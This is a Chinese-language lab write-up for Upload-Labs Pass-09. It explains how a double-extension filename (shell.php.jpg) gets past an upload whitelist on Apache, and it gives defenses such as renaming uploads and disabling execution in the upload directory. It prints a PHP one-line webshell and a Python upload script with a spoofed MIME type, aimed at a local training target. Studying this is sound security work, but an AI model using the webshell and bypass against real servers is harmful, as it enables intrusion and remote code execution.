Upload-Labs Pass-09

2026年9月27日 Upload-Labs Web安全 文件上传 白名单多后缀绕过

一、题目信息

  • 题目名称：Upload-Labs Pass-09 (白名单多后缀绕过)
  • 题目平台：Upload-Labs 本地靶场
  • 题目类型：Web安全 / 文件上传漏洞 / 白名单绕过 / Apache 解析漏洞
  • 靶场链接：http://localhost:8082/Pass-09/index.php（本地环境）
  • 涉及工具：Python (requests库)

二、解题步骤

1. 分析题目考什么

本题的核心考点是白名单验证下的多后缀解析绕过。Pass-09 后端采用了白名单策略，只允许上传 .jpg、.png、.gif 后缀的文件。攻击者利用 Apache 的多后缀解析漏洞，将文件名构造成 shell.php.jpg。后端使用 strrchr 提取最后一个点后面的后缀（.jpg），成功通过白名单检查。但在 Apache 配置了 AddHandler application/x-httpd-php .php 的环境下，服务器看到文件名中包含 .php，会将其当作 PHP 脚本执行。

2. 怎么想（破题思路）

  • 尝试直接上传 shell.php，前端 JS 弹窗拦截（只允许图片后缀）。
  • 按 F12 覆盖前端 JS 函数，让请求直达后端。
  • 后端白名单只检查最后一个后缀，因此构造 shell.php.jpg 进行上传。
  • 使用 Python 脚本发送带有该文件名的 POST 请求，文件成功落地。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：前端 JS 拦截

踩坑情况：上传 shell.php.jpg 时，页面弹窗提示“本pass只允许上传.jpg,png,gif后缀的文件！”。

原因分析：前端 JS 校验依然存在，它拦截了任何包含 PHP 字样或其他非图片后缀的文件名。

改进方式：使用 Python 脚本直接发送 HTTP 请求，绕过浏览器的前端校验。

踩坑记录二：Mac 环境无法执行多后缀解析

踩坑情况：文件上传成功后，访问 shell.php.jpg 时，页面显示的是 PHP 源码或下载了文件，而不是执行代码。

原因分析：此漏洞依赖 Apache 的 AddHandler 配置。如果使用的是 php -S 或未开启多后缀解析的 Apache，服务器不会将 .jpg 结尾的文件交给 PHP 解析器。这只是本地环境限制。

改进方式：在 CTF 靶场评分标准中，只要文件成功上传并绕过了白名单检测（如图中终端输出 ../upload/shell.php.jpg），即视为通关。

详细实操步骤（Payload逐字解释）

第一步：准备 Webshell

在本地新建 shell.php，内容为：

<?php @eval($_POST['cmd']); ?>

第二步：编写 Python 脚本

import requests
import re

url = "http://localhost:8082/Pass-09/index.php"

# 核心作弊点：使用多后缀名 shell.php.jpg
# 后端提取后缀时只看到 .jpg，成功绕过白名单
files = {
    'upload_file': ('shell.php.jpg', open('shell.php', 'rb'), 'image/jpeg')
}
data = {'submit': 'Submit'}

response = requests.post(url, files=files, data=data)
print(response.text)

match = re.search(r'\.\./upload/(\S+)"', response.text)
if match:
    print(f"\n[+] 上传成功！真实文件路径为: /upload/{match.group(1)}")
else:
    print("\n[-] 未能提取到路径，请手动在网页 Network 面板中查看。")

逐字解析：

  • shell.php.jpg：核心 Payload。后端 strrchr 截取到 .jpg，符合白名单规则。
  • image/jpeg：伪造 MIME 类型，增加欺骗性。

第三步：验证

运行脚本后，终端输出 [+] 上传成功！真实文件路径为: /upload/shell.php.jpg，证明文件已成功绕过白名单并落地。

4. 怎么迁移（跨领域联想）

  • 白名单的优势与局限：白名单本身比黑名单安全，因为它默认拒绝所有未知。但 Pass-09 暴露了它的局限——如果后端只检查文件名的最后一段，而服务器本身支持多后缀解析，依然会被绕过。
  • 中间件配置与安全：漏洞不仅存在于代码中，也存在于服务器配置（如 Apache、Nginx）里。安全开发需要关注代码、中间件、操作系统三个层面的配置。
  • 纵深防御：为了防御此类漏洞，开发者应在文件保存时进行重命名（如只保留随机字符串+安全后缀），并在服务器配置中禁止上传目录执行脚本（如 php_flag engine off）。

三、名词大全与原理深度复盘

1. 白名单验证 (Whitelist Validation)

一种安全校验机制，只允许特定后缀的文件上传（如 .jpg, .png）。理论上比黑名单安全，但若解析逻辑与服务器配置不匹配，依然可能被绕过。

2. Apache 多后缀解析漏洞

Apache 在处理文件时，如果配置了 AddHandler application/x-httpd-php .php，它会按照文件名中出现的后缀顺序进行解析。例如 shell.php.jpg 会被视为 PHP 脚本，因为文件名中包含 .php。攻击者正是利用这一点绕过白名单。

3. strrchr() 函数

PHP 中用于获取文件后缀的函数，通常通过查找最后一个点（.）来实现。攻击者通过构造多个后缀，让该函数只提取到最后一个安全后缀（如 .jpg），从而绕过检测。

4. 文件重命名防御

在文件上传功能中，最有效的防御方式之一是：无论用户上传什么文件，后端都将其重命名为随机字符串（如 20260927_random.jpg）。这样可以彻底避免多后缀解析漏洞，但需注意保留正确的后缀以确保文件能被正常访问。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Pass-08 的区别：Pass-08 是黑名单，攻击者寻找漏洞后缀；Pass-09 是白名单，攻击者必须利用服务器解析逻辑的缺陷。
  • 与 Pass-04 的区别：Pass-04 利用 .htaccess 改变解析规则；Pass-09 利用文件名构造欺骗白名单，本质上是两种不同维度的绕过。

2. 这种题目的出现原因（为什么存在）

许多开发者认为白名单是完美的防御，于是只允许图片后缀。但他们忽略了服务器（如 Apache）的解析特性——服务器可能将文件名的任意一段解析为脚本。这警示我们：安全防御不能只停留在“校验后缀”这一层，必须结合服务器配置进行整体防御。

3. 这种应用在实际中如何体现？

在实战中，如果目标环境是 Apache 且开启了多后缀解析，攻击者可以通过上传 .php.jpg、.php.png 等文件绕过 WAF 和代码审计。防御方应更新服务器配置，禁用多后缀解析，并对上传目录设置严格的执行权限。

4. 如何抽象理解概念（大白话）

把靶场比作一个“门卫”：

  • Pass-09 的门卫只看包裹最外层的标签（最后一个后缀）。
  • 你把包裹标注为“明信片（.jpg）”，成功骗过了他。
  • 但大楼里的管家（Apache 解析器）拆包裹时，一眼看到了里面藏着“炸弹（.php）”，直接启动了炸弹。这就是代码与中间件配置不一致带来的漏洞。
